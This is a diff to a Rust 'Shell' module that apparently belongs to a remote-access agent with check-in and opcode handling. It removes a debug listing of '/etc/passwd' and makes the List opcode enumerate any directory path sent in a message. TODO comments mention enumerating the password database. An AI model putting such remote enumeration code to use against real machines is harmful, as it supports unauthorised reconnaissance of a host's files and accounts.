@@ -210,15 +210,6 @@ impl Module for Shell {
         self.identity
     }
     async fn run(&self, bus_channel: Sender<BusMessage>, token: CancellationToken) {
-        // debug
-        let path = b"/etc/passwd";
-        let path_len = (path.len() as u16).to_be_bytes();
-        let mut args = Vec::new();
-        args.extend_from_slice(&path_len);
-        args.extend_from_slice(path);
-        let result = DirWalker::get_listing(args);
-        // end debug
-
         if self.perform_checkin(&bus_channel).await.is_err() {
             token.cancel();
             return;
@@ -246,7 +237,15 @@ impl Module for Shell {
                                 let mut netstat = Netstat::new();
                                 netstat.get_connections()
                             },
-                            ShellOpcodes::List => {Ok(Vec::new())},
+                            ShellOpcodes::List => {
+                                let mut args = Vec::new();
+                                if args.try_reserve(msg.msg.len() - size_of::<u8>()).is_err() {
+                                    break;
+                                }
+
+                                args.extend_from_slice(&msg.msg[size_of::<u8>()..]);
+                                DirWalker::get_listing(args)
+                            }
                         };
 
                         match result {
@@ -276,3 +275,4 @@ impl Module for Shell {
 
 // todo: need to check the error type and if it was critical, etc.
 // todo: currently enumerating passwd_db in each module -- reduce to a single utility
+// todo: add all sozo debug statements to modules
